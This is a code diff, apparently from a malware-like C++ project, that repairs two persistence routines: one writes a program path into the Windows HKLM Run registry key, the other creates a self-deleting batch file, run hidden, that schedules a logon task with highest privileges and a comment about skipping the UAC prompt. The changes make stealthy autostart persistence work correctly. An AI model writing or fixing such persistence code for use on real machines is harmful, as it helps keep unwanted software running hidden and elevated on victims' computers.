@@ -90,20 +90,25 @@ void Manager::ReadData(Settings* s) {
 void Manager::Autorun(const char* path, const char* name) {
 	HKEY reg_key = 0;
 	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, address, 0, KEY_ALL_ACCESS, &reg_key);
-
-	result = RegSetValueEx(reg_key, path, 0, REG_SZ, (LPBYTE)path, sizeof(path) - 1);
-
+	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, address, 0, KEY_SET_VALUE, &reg_key) != ERROR_SUCCESS)
+		return;
+	DWORD len = (DWORD)(strlen(path) + 1);
+	RegSetValueExA(reg_key, name, 0, REG_SZ, (const BYTE*)path, len);
 	RegCloseKey(reg_key);
 }
 
 void Manager::Scheduler(const char* path, const char* name) {
+	// /RL HIGHEST = run with highest available privileges (no UAC prompt at logon)
+	// /F = force-create even if task already exists
+	// /SC ONLOGON = run every time any user logs on
 	std::ofstream schd(BAT_SCHD);
-	schd << "@echo off \n";
-	schd << "SCHTASKS /CREATE /SC ONLOGON /TN \"" + std::string(name) + "\" /TR \"" + std::string(path);
-	schd << "DEL" BAT_SCHD;
+	schd << "@echo off\r\n";
+	schd << "SCHTASKS /CREATE /F /SC ONLOGON /RL HIGHEST /TN \""
+	     << name << "\" /TR \"" << path << "\"\r\n";
+	schd << "DEL \"%~f0\"\r\n";
 	schd.close();
 
+	Sleep(200);
 	ShellExecuteA(0, "open", BAT_SCHD, 0, 0, SW_HIDE);
 }
 
